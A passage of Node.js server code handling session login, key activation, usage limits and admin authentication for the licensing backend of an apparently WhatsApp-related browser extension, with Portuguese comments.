      return;
    }
    let sessionDb = null;
    try {
      const body = await parseBody(req);
      let buildClient = await zvmSecurityCheckClientShared(body.clientSecurity, {});
      const deferredDevV2 = !buildClient.ok && buildClient.code === 'DEV_BUILD_NOT_AUTHORIZED' &&
        Number(body.clientSecurity?.protocol) === 2 && String(body.clientSecurity?.channel || '').toLowerCase() === 'dev';
      const deferredSignedDevV2 = buildClient.ok === true && buildClient.signedDev === true && buildClient.recognized !== true &&
        Number(body.clientSecurity?.protocol) === 2 && String(body.clientSecurity?.channel || '').toLowerCase() === 'dev';
      if (!buildClient.ok && !deferredDevV2) { if (body && typeof body === 'object') delete body.password; sendJson(res, { ok:false, errorCode:buildClient.code }, zvmSecurityClientErrorStatus(buildClient.code)); return; }
      if (!deferredDevV2 && !deferredSignedDevV2 && ZVM_BUILD_ENFORCE && buildClient.recognized!==true && !ZVM_DEV_BUILD_ALLOW) { if (body && typeof body === 'object') delete body.password; sendJson(res, { ok:false, errorCode:'BUILD_NOT_ALLOWED' }, 403); return; }
      const db = await getMongoDb();
      sessionDb = db;
      const authenticated = await authenticateExtensionAccount(body, { db });
      // Reduz a vida da senha em memória após a verificação. Ela nunca é
      // copiada para sessão, entitlement, Mongo ou logs desta API.
      if (body && typeof body === 'object') delete body.password;
      if (!authenticated.ok) {
        const { status, ...errorBody } = authenticated;
        sendJson(res, errorBody, status);
        return;
      }
      if (deferredDevV2 || deferredSignedDevV2) {
        // R46.79: o preflight de uma DEV assinada ja consumiu requestId no
        // anti-replay compartilhado. Revalidar a identidade apos senha/2FA
        // sem consumir novamente evita SECURITY_REPLAY_REJECTED no mesmo POST.
        // DEV anteriormente recusada no preflight ainda precisa consumir aqui.
        buildClient = deferredSignedDevV2
          ? zvmSecurityCheckClient(body.clientSecurity, false, { licenseKey:authenticated.licenseKeyCode || '' })
          : await zvmSecurityCheckClientShared(body.clientSecurity, { licenseKey:authenticated.licenseKeyCode || '' });
        if (!buildClient.ok) { sendJson(res, { ok:false, errorCode:buildClient.code }, zvmSecurityClientErrorStatus(buildClient.code)); return; }
      } else if (Number(buildClient.securityProtocol || 1) === 1) {
        const accountDevAllowed = zvmSecurityDevBuildAllowed(authenticated.licenseKeyCode, body.deviceId);
        if (ZVM_BUILD_ENFORCE && buildClient.recognized!==true && !accountDevAllowed) {
          sendJson(res, { ok:false, errorCode:'BUILD_NOT_ALLOWED' }, 403);
          return;
        }
        if (buildClient.recognized !== true && accountDevAllowed) buildClient = { ...buildClient, developmentAuthorized:true };
      }
      if (buildClient.signedDev === true && authenticated.devAccess !== true) {
        sendJson(res, { ok:false, errorCode:'DEV_ACCESS_REQUIRED' }, 403); return;
      }
      const issued = await createExtensionSession({
        subject: authenticated.subject,
        authMethod: 'password',
        accountEmail: authenticated.accountEmail,
        licenseKeyCode: authenticated.licenseKeyCode,
        phoneNumber: body.phoneNumber,
        deviceId: body.deviceId,
        ...extensionSessionSecurityFields(buildClient),
        entitlementRevision: authenticated.entitlement.entitlementRevision,
      }, { db });
      db.collection('portal_users').updateOne(
        { _id: authenticated.accountEmail },
        { $set: { lastLogin: new Date().toISOString() } }
      ).catch(() => {});
      sendJson(res, extensionSessionSuccess(issued.token, issued.doc, authenticated.entitlement));
    } catch (error) {
      zvmInvalidateMongoOnNetworkError(error, sessionDb);
      console.error('[extension-v4] session/login indisponível:', error.message);
      sendJson(res, { ok: false, errorCode: 'temporarily_unavailable', retryable: true }, 503);
    }
    return;
  }

  if (p === R_EXT+'/v4/session/refresh' && req.method === 'POST') {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
    if (!checkRateLimit(ip, 'api')) {
      sendJson(res, { ok: false, errorCode: 'rate_limited', retryable: true }, 429);
      return;
    }
    const token = getExtensionBearerToken(req);
    if (!token) { sendJson(res, { ok: false, errorCode: 'invalid_session' }, 401); return; }
    try {
      const body = await parseBody(req);
      const refreshed = await refreshExtensionSession(token, { clientSecurity:body?.clientSecurity || null, requireCurrentClientSecurity:true });
      if (!refreshed.ok) {
        const { status, ...errorBody } = refreshed;
        sendJson(res, errorBody, status);
        return;
      }
      sendJson(res, extensionSessionSuccess(token, refreshed.sessionDoc, refreshed.entitlement));
    } catch (error) {
      console.error('[extension-v4] session/refresh indisponível:', error.message);
      sendJson(res, { ok: false, errorCode: 'temporarily_unavailable', retryable: true }, 503);
    }
    return;
  }


  if (p === R_EXT+'/v4/backup/decoder-material' && req.method === 'POST') {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
    if (!checkRateLimit(ip, 'ext_backup_decoder', 20, 60000)) {
      sendJson(res, { ok: false, errorCode: 'rate_limited', retryable: true }, 429);
      return;
    }
    const token = getExtensionBearerToken(req);
    if (!token) { sendJson(res, { ok: false, errorCode: 'invalid_session' }, 401); return; }
    try {
      const refreshed = await refreshExtensionSession(token);
      if (!refreshed.ok) {
        const { status, ...errorBody } = refreshed;
        sendJson(res, errorBody, status);
        return;
      }
      if (refreshed.entitlement?.tier !== 'paid') {
        sendJson(res, { ok: false, errorCode: 'paid_plan_required' }, 403);
        return;
      }
      const body = await parseBody(req);
      if (String(body?.formatRevision || '') !== '1') {
        sendJson(res, { ok: false, errorCode: 'unsupported_format_revision' }, 400);
        return;
      }
      if (EXT_COMPAT_DECODER_V1.length < 12 || EXT_COMPAT_DECODER_V1.length > 256) {
        sendJson(res, { ok: false, errorCode: 'decoder_material_unavailable', retryable: true }, 503);
        return;
      }
      sendJson(res, { ok: true, formatRevision: '1', material: EXT_COMPAT_DECODER_V1 });
    } catch (error) {
      console.error('[extension-v4] backup decoder indisponível:', error.message);
      sendJson(res, { ok: false, errorCode: 'temporarily_unavailable', retryable: true }, 503);
    }
    return;
  }

  if (p === R_EXT+'/v4/session/logout' && req.method === 'POST') {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
    if (!checkRateLimit(ip, 'api')) {
      sendJson(res, { ok: false, errorCode: 'rate_limited', retryable: true }, 429);
      return;
    }
    const token = getExtensionBearerToken(req);
    if (!token) { sendJson(res, { ok: false, errorCode: 'invalid_session' }, 401); return; }
    try {
      const revoked = await revokeExtensionSession(token);
      sendJson(res, { ok: true, revoked: revoked.revoked });
    } catch (error) {
      console.error('[extension-v4] session/logout indisponível:', error.message);
      sendJson(res, { ok: false, errorCode: 'temporarily_unavailable', retryable: true }, 503);
    }
    return;
  }

  if (p === R_EXT+'/v3/key' && req.method === 'POST') {
    if (!checkRateLimit(ip, 'ext_key_v3')) {
      sendExtensionRateLimited(res, ip, 'ext_key_v3', { authError: 'rateLimited', authErrorMessage: 'Muitas tentativas. Aguarde.', isLoggedIn: false });
      return;
    }
    if (parseInt(req.headers['content-length'] || 0) > MAX_BODY_SIZE) {
      sendJson(res, { authError: 'invalidRequest', authErrorMessage: 'Payload muito grande.', isLoggedIn: false }, 413);
      return;
    }
    const body = await parseBody(req);
    const keyCode    = sanitizeId(body.authKey, 32);
    const phone      = body.phoneNumber || '-';
    const wppVersion = body.wppVersion  || '-';
    const deviceId   = body.deviceId    || '';
    if (!legacyV3Allowed() && !body.clientSecurity) {
      sendJson(res, { authError:'buildNotAllowed', authErrorMessage:'Build da extensão não autorizada.', isLoggedIn:false, errorCode:'SECURITY_CLIENT_REQUIRED' }, 403);
      return;
    }
    if (body.clientSecurity) {
      const devBuildAllowed = zvmSecurityDevBuildAllowed(keyCode, deviceId);
      const buildClient = await zvmSecurityCheckClientShared(body.clientSecurity, { allowUnrecognized:devBuildAllowed });
      if (!buildClient.ok) {
        sendJson(res, { authError:'buildNotAllowed', authErrorMessage:'Build da extensão não autorizada.', isLoggedIn:false, errorCode:buildClient.code }, zvmSecurityClientErrorStatus(buildClient.code));
        return;
      }
    }

    if (isFreeAuthKey(keyCode)) {
      sendJson(res, getFreeAuthData());
      return;
    }

    if (!keyCode) {
      sendJson(res, { authError: 'keyNotFound', authErrorMessage: 'Chave não encontrada.', isLoggedIn: false });
      return;
    }
    const _load = await ensureKeyLoadedEx(keyCode);
    if (_load.dbError) {
      // Banco/rede indisponivel: NAO sabemos se a chave e valida, entao NAO
      // deslogamos. Respondemos erro temporario (sem isLoggedIn:false) — a
      // extensao trata 5xx como falha de rede e tenta de novo, mantendo a sessao.
      // Sem isto, uma queda de <1min desloga todos os numeros de chaves ATIVAS.
      // Corpo NEUTRO de proposito: sem authError/authErrorMessage/isLoggedIn, para
      // que a extensao nao interprete como veredito de autenticacao.
      sendJson(res, { error: 'temporarily_unavailable', retryable: true }, 503);
      return;
    }
    if (!_load.found) {
      sendJson(res, { authError: 'keyNotFound', authErrorMessage: 'Chave não encontrada. Contate o vendedor.', isLoggedIn: false });
      addLog({ keyCode, label: '-', phone, ip, wppVersion, action: 'key_not_found' }).catch(()=>{});
      return;
    }
    if (isKeyExpired(keys[keyCode])) {
      keys[keyCode].active = false;
      sendJson(res, { authError: 'keyExpired', reason: 'expired', isLoggedIn: false, data: { message: `${AUTH_MSG.EXPIRED}. Chave expirada.`, permissions: [] } }, 403);
      addLog({ keyCode, label: keys[keyCode].label, phone, ip, wppVersion, action: 'expired' }).catch(()=>{});
      saveKey(keyCode).catch(()=>{});
      fireWebhook('key_expired', keyCode, 'Expiração detectada no v3/key');
      return;
    }
    if (!keys[keyCode].active) {
      sendJson(res, { authError: 'keyBlocked', reason: 'blocked', isLoggedIn: false, data: { message: `${AUTH_MSG.BLOCKED}. Chave bloqueada.`, permissions: [] } }, 403);
      addLog({ keyCode, label: keys[keyCode].label, phone, ip, wppVersion, action: 'login_blocked' }).catch(()=>{});
      _trackKeyFail(keyCode, ip);
      return;
    }

    if (!keys[keyCode].phones) {
      keys[keyCode].phones = keys[keyCode].lastPhone ? [keys[keyCode].lastPhone] : [];
    }

    const hasPhone   = phone && phone !== '-';
    const keyMaxUses = (typeof keys[keyCode].maxUses === 'number') ? keys[keyCode].maxUses : MAX_USES;
    // Sem telefone: nada a reivindicar (cliente legado sem readWppContext
    // funcional, ou requisição antes do WhatsApp estar pronto) - phones[]/
    // uses ficam intocados, exatamente como sempre.
    let claimResult = { status: 'already_member' };

    let _legacyReloginCacheKey = '';
    let _legacyReloginSignature = '';

    if (hasPhone) {
      // Teto global de segurança (independente de maxUses por chave) -
      // checagem best-effort em memória, preservando o comportamento não-
      // atômico de sempre; é uma rede adicional, não o limite comercial
      // (esse é protegido atomicamente em claimPhoneSlotAtomic abaixo).
      // Nunca se aplica a um telefone que já é membro (relogin nunca deve
      // esbarrar num teto de segurança).
      const alreadyKnown = keys[keyCode].phones.some(p => normalizePhone(p) === normalizePhone(phone));
      if (!alreadyKnown && keys[keyCode].phones.length >= MAX_PHONES_GLOBAL) {
        addSecurityAlert('PHONE_CAP', `Chave atingiu teto global de ${MAX_PHONES_GLOBAL} telefones`, ip);
        sendJson(res, { authError: 'phoneLimitGlobal', isLoggedIn: false, data: { message: 'Limite máximo de dispositivos atingido.', permissions: [] } }, 403);
        return;
      }

      // R42 — Build 3 congelado faz relogin a cada 5 min. Só usamos o
      // fast-path quando o telefone JÁ é membro, uses está consistente e
      // não há ativação diferida pendente. Mudanças comerciais/autorização
      // alteram a assinatura e invalidam o cache imediatamente.
      const _usesConsistent = Number(keys[keyCode].uses || 0) === keys[keyCode].phones.length;
      const _deferredPending = !!(keys[keyCode].expireDuration && !keys[keyCode].expiresAt);
      if (alreadyKnown && _usesConsistent && !_deferredPending) {
        _legacyReloginSignature = legacyKeyStateSignature(keys[keyCode]);
        _legacyReloginCacheKey = legacyReloginCacheKey({
          keyCode, phone, deviceId, ip, wppVersion, userName: body.userName || ''
        });
        const _legacyReloginCached = ZVM_LEGACY_V3_SHIELD.getKey(_legacyReloginCacheKey, _legacyReloginSignature);
        if (_legacyReloginCached) {
          // Mantém frescor operacional em memória sem gerar escrita periódica.
          keys[keyCode].lastUsed = new Date().toISOString();
          ZVM_LEGACY_V3_SHIELD.noteDbWritesAvoided(deviceId ? 2 : 1);
          maybeLogLegacyV3Shield();
          res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
          sendJson(res, _legacyReloginCached);
          return;
        }
      } else {
        ZVM_LEGACY_V3_SHIELD.noteKeyBypass();
      }

      claimResult = await claimPhoneSlotAtomic(keyCode, phone, keyMaxUses);

      if (claimResult.status === 'limit_reached') {
        keys[keyCode].warnCount = (keys[keyCode].warnCount || 0) + 1;
        const warnTs = keys[keyCode].warnCountTs;
        if (warnTs && (Date.now() - new Date(warnTs).getTime()) > 24*3600*1000) {
          keys[keyCode].warnCount = 1;
        }
        keys[keyCode].warnCountTs = new Date().toISOString();
        sendJson(res, {
          warnLimit: true, isLoggedIn: false, warnRemaining: keys[keyCode].warnCount,
          data: { message: `${AUTH_MSG.USER_NOT_FOUND}. Limite de ativações atingido (${claimResult.uses}/${keyMaxUses}).`, permissions: [] }
        }, 403);
        addLog({ keyCode, label: keys[keyCode].label, phone, ip, wppVersion, action: 'warn_limit' }).catch(()=>{});
        saveKey(keyCode).catch(()=>{});
        return;
      }

      // Metadata opcional (só se deviceId veio) - nunca bloqueia login,
      // fire-and-forget de propósito.
      upsertActivation(keyCode, phone, deviceId, { ip, wppVersion }).catch(() => {});
    }

    const isNewPhone = hasPhone && claimResult.status === 'claimed';

    // ATIVAÇÃO ATÔMICA: chaves com "Aguardando 1º uso" precisam gravar expiresAt no
    // MongoDB ANTES de responder ao cliente. saveKey() é debounced (2s) e fire-and-forget —
    // se o processo morrer antes, o expiresAt nunca é persistido e a chave fica
    // eternamente em "aguardando", permitindo uso ilimitado. activateDeferredKey() usa
    // updateOne com filtro { expiresAt: null } (atômico) e só retorna true após o
    // MongoDB confirmar modifiedCount >= 1.
    if (keys[keyCode].expireDuration && !keys[keyCode].expiresAt) {
      try {
        const activated = await activateDeferredKey(keyCode);
        if (!activated) {
          sendJson(res, {
            authError: 'activationFailed',
            authErrorMessage: 'Falha ao registrar ativação. Tente novamente.',
            isLoggedIn: false,
          }, 503);
          addLog({ keyCode, label: keys[keyCode].label, phone, ip, wppVersion, action: 'activation_failed' }).catch(()=>{});
          return;
        }
      } catch (e) {
        console.error('[CRITICAL] activateDeferredKey falhou:', e.message);
        sendJson(res, {
          authError: 'activationFailed',
          authErrorMessage: 'Erro interno ao ativar chave. Tente novamente.',
          isLoggedIn: false,
        }, 503);
        return;
      }
    }

    keys[keyCode].lastUsed   = new Date().toISOString();
    keys[keyCode].lastIp     = ip;
    keys[keyCode].wppVersion = wppVersion;
    if (hasPhone) keys[keyCode].lastPhone = phone;
    if (deviceId) keys[keyCode].deviceId  = deviceId;
    // Histórico de dispositivos (máx 20, deduplicado por ip+phone)
    if (!keys[keyCode].deviceHistory) keys[keyCode].deviceHistory = [];
    const _dhKey = (ip||'')+'|'+(hasPhone?phone:'-');
    const _dhIdx = keys[keyCode].deviceHistory.findIndex(d => d.k === _dhKey);
    const _dhEntry = { k: _dhKey, ip: ip||'-', phone: hasPhone?phone:'-', wppVersion, lastSeen: new Date().toISOString() };
    if (_dhIdx >= 0) keys[keyCode].deviceHistory[_dhIdx] = _dhEntry;
    else { keys[keyCode].deviceHistory.unshift(_dhEntry); if (keys[keyCode].deviceHistory.length > 20) keys[keyCode].deviceHistory.pop(); }

    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
    const _legacyAuthPayload = getAuthData(keyCode, body.userName || '');
    sendJson(res, _legacyAuthPayload);

    const _action = isNewPhone ? 'login_ok' : 'relogin_ok';
    addLog({ keyCode, label: keys[keyCode].label, phone, ip, wppVersion, action: _action }).catch(()=>{});
    saveKey(keyCode).catch(()=>{}); // não-crítico: lastUsed/lastIp/wppVersion

    // Semeia o fast-path só DEPOIS do caminho autoritativo completo.
    if (hasPhone && Array.isArray(keys[keyCode].phones) &&
        Number(keys[keyCode].uses || 0) === keys[keyCode].phones.length &&
        !(keys[keyCode].expireDuration && !keys[keyCode].expiresAt)) {
      const _seedSignature = legacyKeyStateSignature(keys[keyCode]);
      const _seedCacheKey = legacyReloginCacheKey({
        keyCode, phone, deviceId, ip, wppVersion, userName: body.userName || ''
      });
      ZVM_LEGACY_V3_SHIELD.setKey(_seedCacheKey, _seedSignature, _legacyAuthPayload);
    }
    return;
  }

  if (p === R_EXT+'/v3/check-status' && req.method === 'POST') {
    if (!legacyV3Allowed()) { sendJson(res, { error:'legacy_endpoint_disabled', retryable:false }, 403); return; }
    if (!checkRateLimit(ip, 'check_status')) {
      // Estado incerto não renova acesso. O cliente pode aplicar a grace de
      // rede já existente, mas não recebe um novo veredito active:true.
      sendJson(res, { error: 'rate_limited', retryable: true }, 429); return;
    }
    const body    = await parseBody(req); // 64 KB limit + prototype-pollution guard
    const keyCode = sanitizeId(body.authKey, 32);
    if (!serverReady) { sendJson(res, { error: 'temporarily_unavailable', retryable: true }, 503); return; }
    if (!keyCode)     { sendJson(res, { error: 'invalid_request' }, 400); return; }
    if (isFreeAuthKey(keyCode)) {
      sendJson(res, {
        active: true,
        expiringSoon: false,
        hoursLeft: null,
        daysLeft: null,
        expiresAt: null,
        deferred: false,
        isPremium: false,
        isFreePlan: true,
        isBasicPlan: false,
        planId: FREE_PLAN_ID,
        planName: 'Gratuito',
        usageAuthority: 'server',
        modules: { ...DEFAULT_MODULES },
        ts: Date.now()
      });
      return;
    }
    const _cs = await ensureKeyLoadedEx(keyCode);
    if (_cs.dbError) {
      // Banco inacessível não prova nem revogação nem entitlement ativo.
      // Resposta neutra/retryable preserva a grace do cliente sem renovar
      // active:true com base em incerteza.
      sendJson(res, { error: 'temporarily_unavailable', retryable: true }, 503); return;
    }
    if (!_cs.found) {
      sendJson(res, { active: false, reason: 'not_found' }); return;
    }
    const _k = sanitizeKeyRecord(keys[keyCode]);
    const _csPhone = body.phoneNumber ? normalizePhone(body.phoneNumber) : '';
    const _csCacheKey = keyCode + '|' + _csPhone;

    // Expiração é verificada ANTES do cache porque avança com o relógio mesmo
    // quando o registro não muda. A primeira detecção persiste active=false;
    // chamadas subsequentes batem no cache negativo e não regravam o Mongo.
    if (isKeyExpired(_k)) {
      _k.active = false;
      const _expiredSig = legacyKeyStateSignature(_k);
      const _expiredCached = ZVM_LEGACY_V3_SHIELD.getCheck(_csCacheKey, _expiredSig);
      if (_expiredCached) {
        maybeLogLegacyV3Shield();
        sendJson(res, _expiredCached); return;
      }
      const _expiredPayload = { active: false, reason: 'expired' };
      ZVM_LEGACY_V3_SHIELD.setCheck(_csCacheKey, _expiredSig, _expiredPayload);
      saveKey(keyCode).catch(()=>{});
      sendJson(res, _expiredPayload); return;
    }

    const _csSig = legacyKeyStateSignature(_k);
    const _csCached = ZVM_LEGACY_V3_SHIELD.getCheck(_csCacheKey, _csSig);
    if (_csCached) {
      maybeLogLegacyV3Shield();
      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
      res.setHeader('X-Content-Type-Options', 'nosniff');
      sendJson(res, _csCached);
      return;
    }

    if (!_k.active) {
      const _blockedPayload = { active: false, reason: 'blocked' };
      ZVM_LEGACY_V3_SHIELD.setCheck(_csCacheKey, _csSig, _blockedPayload);
      addLog({ keyCode, label: _k.label||'-', phone: '-', ip, wppVersion: '-', action: 'check_blocked' }).catch(()=>{});
      sendJson(res, _blockedPayload); return;
    }

    // Extensão opt-in, retrocompatível: corpo legado {authKey} nunca passa
    // por aqui (phoneNumber ausente). Se o cliente novo mandar phoneNumber,
    // confirma que esse telefone especificamente ainda está autorizado.
    if (_csPhone) {
      const _csPhones = Array.isArray(_k.phones) ? _k.phones : [];
      const _csStillAuthorized = _csPhones.some(p => normalizePhone(p) === _csPhone);
      if (!_csStillAuthorized) {
        const _removedPayload = { active: false, reason: 'phone_removed' };
        ZVM_LEGACY_V3_SHIELD.setCheck(_csCacheKey, _csSig, _removedPayload);
        addLog({ keyCode, label: _k.label||'-', phone: body.phoneNumber, ip, wppVersion: '-', action: 'check_phone_removed' }).catch(()=>{});
        sendJson(res, _removedPayload); return;
      }
    }

    const _activePayload = {
      active:         true,
      expiringSoon:   isKeyExpiringSoon(_k),
      hoursLeft:      hoursUntilExpiry(_k),
      daysLeft:       daysUntilExpiry(_k),
      expiresAt:      _k.expiresAt || null,
      deferred:       !!(_k.expireDuration && !_k.expiresAt),
      isPremium:      !_k.isBasicPlan,
      isFreePlan:     false,
      isBasicPlan:    !!_k.isBasicPlan,
      planId:         _k.plan_id || _k.planId || 'ZV_PRO',
      planName:       _k.planName || (_k.isBasicPlan ? 'Basic' : 'Pro'),
      usageAuthority: 'server',
      modules:        { ...DEFAULT_MODULES, ...(_k.modules || {}) },
      ts:             Date.now()
    };
    ZVM_LEGACY_V3_SHIELD.setCheck(_csCacheKey, _csSig, _activePayload);
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    sendJson(res, _activePayload);
    return;
  }

  if (p === R_EXT+'/v3/usage' && req.method === 'POST') {
    if (!checkRateLimit(ip, 'legacy_v3_usage')) {
      sendJson(res, { ok: false, status: false, data: { errorType: 'RATE_LIMITED', message: 'Muitas requisições' } }, 429);
      return;
    }
    const body = await parseBody(req);
    const keyCode = await resolveUsageKey(body);
    if (!legacyV3Allowed() && keyCode && keyCode !== FREE_AUTH_KEY) {
      sendJson(res, { ok:false, status:false, data:{ errorType:'LEGACY_PAID_USAGE_DISABLED' } }, 403);
      return;
    }
    if (!keyCode) {
      sendJson(res, { ok: false, status: false, data: { errorType: 'KEY_NOT_FOUND' } }, 404);
      return;
    }
    const phone = body.phoneNumber || '-';
    if (keyCode === FREE_AUTH_KEY) {
      const usage = ensureFreeUsage(phone);
      if (body.hasError) {
        const payload = buildUsagePayload(FREE_AUTH_KEY, phone);
        sendJson(res, { ok: true, status: true, limits: payload.limits, expires_at: payload.expires_at });
        return;
      }
      const result = incrementUsageRow(usage, body.itemType, FREE_USAGE_LIMITS, body.scheduledItems);
      if (!result.ok) {
        sendJson(res, { ok: false, status: false, data: { errorType: result.errorType, message: result.message } }, 403);
        return;
      }
      const payload = buildUsagePayload(FREE_AUTH_KEY, phone);
      sendJson(res, { ok: true, status: true, limits: payload.limits, expires_at: payload.expires_at, isExpired: false });
      return;
    }
    if (keyCode === PAID_USAGE_KEY) {
      const payload = unlimitedUsagePayload();
      if (!body.hasError && body.itemType) {
        incrementUsageRow(payload.limits, body.itemType, USAGE_LIMITS, body.scheduledItems);
      }
      sendJson(res, { ok: true, status: true, ...payload, isExpired: false });
      return;
    }
    if (!keys[keyCode].active || isKeyExpired(keys[keyCode])) {
      sendJson(res, { ok: false, status: false, data: { errorType: 'KEY_INVALID', message: 'Chave inválida' } }, 403);
      return;
    }
    sanitizeKeyRecord(keys[keyCode]);
    if (!keys[keyCode].isBasicPlan) {
      const payload = unlimitedUsagePayload();
      if (!body.hasError && body.itemType) {
        incrementUsageRow(payload.limits, body.itemType, USAGE_LIMITS, body.scheduledItems);
      }
      sendJson(res, { ok: true, status: true, ...payload, isExpired: false });
      return;
    }
    const usage = ensureKeyUsage(keys[keyCode], USAGE_LIMITS);
    normalizeProUsage(usage, keys[keyCode]);
    if (body.hasError) {
      sendJson(res, { ok: true, status: true, limits: usage, expires_at: buildUsagePayload(keyCode, phone).expires_at });
      return;
    }
    const result = incrementUsageRow(usage, body.itemType, keys[keyCode].usageLimits || USAGE_LIMITS, body.scheduledItems);
    if (!result.ok) {
      sendJson(res, { ok: false, status: false, data: { errorType: result.errorType, message: result.message } }, 403);
      return;
    }
    saveKey(keyCode).catch(() => {});
    const payload = buildUsagePayload(keyCode, phone);
    sendJson(res, { ok: true, status: true, limits: payload.limits, expires_at: payload.expires_at, isExpired: false });
    return;
  }

  if (p === R_EXT+'/v3/get-usage' && req.method === 'POST') {
    if (!legacyV3Allowed()) { sendJson(res, { ok:false, status:false, data:{ errorType:'LEGACY_ENDPOINT_DISABLED' } }, 403); return; }
    if (!checkRateLimit(ip, 'legacy_v3_usage')) {
      sendJson(res, { ok: false, status: false, data: { errorType: 'RATE_LIMITED' } }, 429);
      return;
    }
    const body = await parseBody(req);
    const keyCode = await resolveUsageKey(body);
    if (!keyCode) {
      sendJson(res, { ok: false, status: false, data: { errorType: 'KEY_NOT_FOUND' } }, 404);
      return;
    }
    const payload = buildUsagePayload(keyCode, body.phoneNumber || '');
    if (!payload) {
      sendJson(res, { ok: false, status: false, data: { errorType: 'KEY_NOT_FOUND' } }, 404);
      return;
    }
    if (keyCode !== FREE_AUTH_KEY && keyCode !== PAID_USAGE_KEY) saveKey(keyCode).catch(() => {});
    sendJson(res, { ok: true, status: true, ...payload });
    return;
  }

  if (p === R_EXT+'/v3/sync-usage' && req.method === 'POST') {
    if (!legacyV3Allowed()) { sendJson(res, { ok:false, status:false, data:{ errorType:'LEGACY_ENDPOINT_DISABLED' } }, 403); return; }
    if (!checkRateLimit(ip, 'legacy_v3_usage')) {
      sendJson(res, { ok: false, status: false, data: { errorType: 'RATE_LIMITED' } }, 429);
      return;
    }
    const body = await parseBody(req);
    const keyCode = await resolveUsageKey(body);
    if (!keyCode) {
      sendJson(res, { ok: false, status: false, data: { errorType: 'KEY_NOT_FOUND' } }, 404);
      return;
    }
    if (keyCode === FREE_AUTH_KEY) {
      const usage = ensureFreeUsage(body.phoneNumber || '');
      if (body.extensionLimits && typeof body.extensionLimits === 'object') {
        for (const t of USAGE_ITEM_TYPES) {
          if (body.extensionLimits[t] && typeof body.extensionLimits[t].sent === 'number') {
            usage[t].sent = Math.max(usage[t].sent || 0, body.extensionLimits[t].sent);
          }
        }
      }
      sendJson(res, { ok: true, status: true, limits: usage });
      return;
    }
    if (keyCode === PAID_USAGE_KEY) {
      const payload = unlimitedUsagePayload(body.extensionLimits);
      sendJson(res, { ok: true, status: true, limits: payload.limits, expires_at: payload.expires_at });
      return;
    }
    sanitizeKeyRecord(keys[keyCode]);
    if (!keys[keyCode].isBasicPlan) {
      const payload = unlimitedUsagePayload(body.extensionLimits);
      sendJson(res, { ok: true, status: true, limits: payload.limits, expires_at: payload.expires_at });
      saveKey(keyCode).catch(() => {});
      return;
    }
    const usage = ensureKeyUsage(keys[keyCode], USAGE_LIMITS);
    normalizeProUsage(usage, keys[keyCode]);
    if (body.extensionLimits && typeof body.extensionLimits === 'object') {
      for (const t of USAGE_ITEM_TYPES) {
        if (body.extensionLimits[t] && typeof body.extensionLimits[t].sent === 'number') {
          usage[t].sent = Math.max(usage[t].sent || 0, body.extensionLimits[t].sent);
        }
      }
    }
    saveKey(keyCode).catch(() => {});
    sendJson(res, { ok: true, status: true, limits: usage });
    return;
  }


  if ([R_EXT+'/v3/usage', R_EXT+'/v3/get-usage', R_EXT+'/v3/sync-usage'].includes(p)) {
    sendJson(res, { ok: false, status: false, data: { errorType: 'METHOD_NOT_ALLOWED' } }, 405);
    return;
  }

  // The canonical Admin login lives on the panel root. Old /login links are
  // intentionally redirected; legacy POST /login remains accepted for open tabs.
  if (p === R_ADMIN+'/login' && (req.method === 'GET' || req.method === 'HEAD')) {
    res.writeHead(302, { Location: R_ADMIN, 'Cache-Control': 'no-store' }); res.end(); return;
  }

  if ((p === R_ADMIN || p === R_ADMIN+'/login') && req.method === 'POST') {
    if (!requireSameOriginPost(req)) { sendHtml(res, 'Forbidden', 403); return; }
    if (!checkRateLimit(ip, 'login')) {
      const mins = getRateLimitWait(ip, 'login');
      sendAuthHtml(res, renderAdminLogin(`⏳ Muitas tentativas. Aguarde ${mins} minuto(s).`), 429); return;
    }
    const form   = await parseFormBody(req);
    const _u  = Buffer.from(form.get('user') || '');
    const _au = Buffer.from(ADMIN_USER || '');
    let credOk = false;
    try {
      // Deriva hash da senha submetida com o mesmo salt do boot — timing-safe
      const _submittedHash = crypto.scryptSync(form.get('pass') || '', _adminPassSalt, 64, { N: 16384, r: 8, p: 1 });
      credOk = _u.length === _au.length &&
        crypto.timingSafeEqual(_u.length ? _u : Buffer.alloc(1), _au.length ? _au : Buffer.alloc(1)) &&
        crypto.timingSafeEqual(_submittedHash, _adminPassHash);
    } catch { credOk = false; }
    const totpOk = verifyTOTP(TOTP_SECRET, (form.get('totp') || '').trim());
    if (credOk && totpOk) {
      rateLimitMap.delete(ip + ':login'); // limpa contador após login bem-sucedido
      // Rotação de sessão: invalida token anterior para prevenir session fixation
      const _oldMatch = (req.headers.cookie||'').match(/zv_admin=([a-f0-9]+)/);
      if (_oldMatch) delete sessions[_oldMatch[1]];
      const token = generateToken();
      sessions[token] = { expiresAt: new Date(Date.now() + 8*60*60*1000).toISOString(), ip, loginAt: new Date().toISOString(), createdAt: new Date().toISOString(), absoluteExpiresAt: new Date(Date.now() + SESSION_ABSOLUTE_LIMIT_MS).toISOString() };
      setSessionCookie(res, 'zv_admin', token);
      res.writeHead(302, { Location: R_ADMIN }); res.end();
    } else {
      const msg = credOk && !totpOk ? 'Código 2FA inválido ou expirado' : 'Usuário ou senha incorretos';
      addSecurityAlert('BRUTE_FORCE', `Admin login falhou — ${credOk?'2FA inválido':'credencial errada'} · user="${String(form.get('user')||'').slice(0,20)}"`, ip);
      sendAuthHtml(res, renderAdminLogin(msg));
    }
    return;
  }

  if (p === R_ADMIN+'/logout') {
    clearSessionCookie(res, 'zv_admin');
    res.writeHead(302, { Location: R_ADMIN }); res.end(); return;
  }

  if (p === R_ADMIN || p === R_ADMIN+'/') {
    if (!isAdminSession(req)) { sendAuthHtml(res, renderAdminLogin()); return; }
    const portalUsersResult = await loadAdminPortalUsers({ limit: 1000 });
    const portalUsers = portalUsersResult.users || [];
    let keysSnapshot;
    try { keysSnapshot = await readAdminKeysSnapshot(); }
    catch (e) {
      console.error('[ADMIN] leitura das chaves no MongoDB:', e.message);
      sendJson(res, { ok:false, error:'admin_data_unavailable', retryable:true }, 503); return;
    }
